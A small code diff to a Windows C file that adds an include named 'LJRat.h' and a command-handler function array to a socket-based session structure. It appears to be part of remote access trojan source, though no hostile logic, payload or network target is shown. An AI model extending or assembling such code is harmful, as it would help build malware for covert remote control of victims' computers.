@@ -7,6 +7,7 @@
 #include <Windows.h>
 #include "error_code.h"
 #include "list.h"
+#include "LJRat.h"
 
 typedef struct _session_ctx {
     int gShutdown;
@@ -14,6 +15,7 @@ typedef struct _session_ctx {
     SRW_LIST_HEAD send_list;
     HANDLE hJobWait;
     SOCKET sock;
+    CMDFUNC pFuncArray[FUNCARRAYSIZE];
 } SESSION_CTX, *PSESSION_CTX;
 
 /*
